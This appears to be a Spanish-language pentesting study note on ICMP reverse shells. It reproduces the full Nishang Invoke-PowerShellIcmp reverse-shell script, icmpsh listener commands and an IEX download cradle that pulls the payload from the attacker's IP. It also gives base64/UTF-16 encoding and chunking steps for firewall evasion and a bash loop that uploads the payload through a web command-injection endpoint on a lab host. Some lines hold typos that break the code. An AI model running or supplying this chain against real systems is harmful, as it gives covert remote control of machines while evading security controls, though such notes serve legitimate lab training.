-----
- Tags: #teoria #practica #explotación
-----
# ICMP
### El **Internet Control Message Protocolo** es parte del conjunto de protocolos IP. Es utilizado para enviar mensjes de error e información operativa indicando, por ejemplo, que un host no puede ser localizado o que un servicio se ha solicitao no está disponible.

-----
# Abuso 

### La técnica **ICMP Reverse Shell** es utilizada para establecer una conexión inversa a través del protocolo ICMP desede una máquina comprometida a una máquina atacante. Esta técnica puede ser utilizada para evadir detecciones de seguridad y firewalls, ya que el tráfico ICMP a menudo se permite en muchas redes.

### En este caso, podríamos usar el repositorio de [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1) en donde se comparten scripts como **PowerShellIcmp.ps1**.

```powershell
function Invoke-PowerShellIcmp
{        
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $false)]
        [Int]
        $Delay = 5,

        [Parameter(Position = 2, Mandatory = $false)]
        [Int]
        $BufferSize = 128

    )

    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptionsInvoke-PowerShellIcmp
    $PingOptions.DontFragment = $True

    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null

    while ($true)
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes('')
        $reply = $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)
        
        if ($reply.Buffer)
        {
            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
            $sendbytes = ([text.encoding]::ASCII).GetBytes($result)
            $index = [math]::floor($sendbytes.length/$BufferSize)
            $i = 0

            if ($sendbytes.length -gt $BufferSize)
            {
                while ($i -lt $index )
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                    $i +=1
                }
                $remainingindex = $sendbytes.Length % $BufferSize
                if ($remainingindex -ne 0)
                {
                    $sendbytes2 = $sendbytes[($i*$BufferSize)..($sendbytes.Length)]
                    $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null
                }
            }
            else
            {
                $ICMPClient.Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null
            }
            $sendbytes = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
            $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
}
```
### De este script podríamos eliminar todos los comentarios e invocar el mismo al final, agregando la línea `Invoke-PowerShellIcmp -IPAddress {our_ip}`. Puede ser interesante de cara a evitar posibles **black_lists** o **configuraciones de firewall** cambiar el nombre a la función.

### Una vez descargado el script, deberiamos ejecutar dos procesos específicos.

### **1.** Configurar el sistema para que ignore todas las solicitudes de eco ICMP entrantes, lo que es equivalente a desactivar la respuesta a los pings. Esto puede utilizarse como una medida de seguridad para evitar que otros equipos realicen ping al sistema.

```bash
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
```
### **2.** Descargar el script [icmpsh_m.py](https://github.com/bdamele/icmpsh/blob/master/icmpsh_m.py) y ejecutarlo con las indicaciones dadas. El mismo implementa el shell inverso a través del protocolo ICMP.

```bash
sudo python icmpsh_m.py {our_ip} {target_ip}
```
### En caso de que no podamos subir a la máquina víctima el mismo con   `IEX(New-Object Net.WebClient).downloadString('hgttp://{our_ip}/icmp_PowerShellIcmp.ps1')` podríamos intentar aplicar el concepto de `echo 'line to add' > C:\Temp\file` para línea por línea intentar cargar este script en un path determinado del sistema. 

### Para realizar esto es importante quitar todos los saltos de línea del script.

```bash
cat PowerShellIcmp.ps1 | sed '/^\s*$/d' | sponge PowerShellIcmp.ps1
# El \s es equivalente al espacio, por lo que se indica eliminar todo lo que empiece (^) con un espacio (\s) y acabe ($) con nada serán eliminadas (/d)
```
### Una vez eliminados los espacios, hay que tener en cuenta que los carácteres especiales sean un problema, por lo que es buena idea empezar a pensar en **base64**, aunque PowerShell no lo interpretará de manera correcta debido a los caracteres y el formato de codificación de los archivos de script.

### Por lo que habría que cambiar con la herramienta **iconv** el formato de codificación del archivo a UTF-16, ya que es la manera en la que powershell espera leerlo.

```bash
cat PowerShellIcmp.ps1 | iconv -t utf-16le | base64 -w 0; echo > icmp_base64.ps1
```
### De esta manera ahora tendríamos en poder un archivo con todo el script a cargar en el sistema víctima en el formato correcto y en base64.

### Si tuvieramos que subir este archivo a la máquina victima y no tendríamos conectividad por TCP por **Firewalls**, sería importante tener en cuenta que no podríamos hacerlo de una única vez debido a que el comando **curl** o mismo el navegador tienen un limite, por lo que es buena idea emitir este por partes. Para realizar esto podemos hacer uso de la herramienta **fold** (Herramienta utilizada para dar formato y ajustar el ancho de las líneas de un archivo o texto). 

```bash
fold icmp_base64.ps1 | sponge icmp_base64.ps1
```

### Una vez que tengamos el contenido de manerar óptima, quedaría subir el archivo. Por lo que podríamos crearnos un script en bash o python.

```bash
#!/bin/bash

function ctrl_c(){
	echo -e "\n\n\t[!] Quiting...\n\n"
	tput cnorm; exit 1
}

declare -r url="http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx"

counter=0

echo; tput civis; for line in $(cat icmp.ps1.b64); do
	command="echo+$line+>>+C:\Temp\icmp_cmd.ps1"
	echo -ne "[+] Line $counter sended [$counter/87]\r"
	curl -s -X GET "$url?xcmd=$command" &>/dev/null
	let counter+=1
done; tput cnorm
```
### Una vez subido el archivo, el problema al cual nos enfrentamos es que tenemos toda la fución de PowerShell en base64, por lo que habría que decodearlo. Para hacer esto podríamos hacer uso de herramientas como **pwsh** las cuales nos brindan un entorno de prueba de PowerShell.

```powershell
powershell $functionb64 = Get-Content C:\Temp\icmp_cmd.ps1
# Guardar en la varibale functionb64 el contenido alojado en el archivo C:\Temp\icmp_cmd.ps1

powershell $decodeFunction = [System.Text.Encoding]::Unicode.getString([System.Convert]::FromBase64String($file64))
# Decodear de base64 el contenido de la función.

powershell $decodeFunction > C:\Temp\final_icmp_cmd.ps1
# Guardar la función decodeada en un nuevo archivo C:\Temp\final_icmp_cmd.ps1

powershell $functionb64 = Get-Content C:\Temp\icmp_cmd.ps1; $decodeFunction = [System.Text.Encoding]::Unicode.getString([System.Convert]::FromBase64String($file64)); $decodeFunction > C:\Temp\final_icmp_cmd.ps1
```
### Como último, solo quedaría ejecutar el script final **powershell C:\Temp\final_icmp_cmd.ps1** y recibir la conexión. 
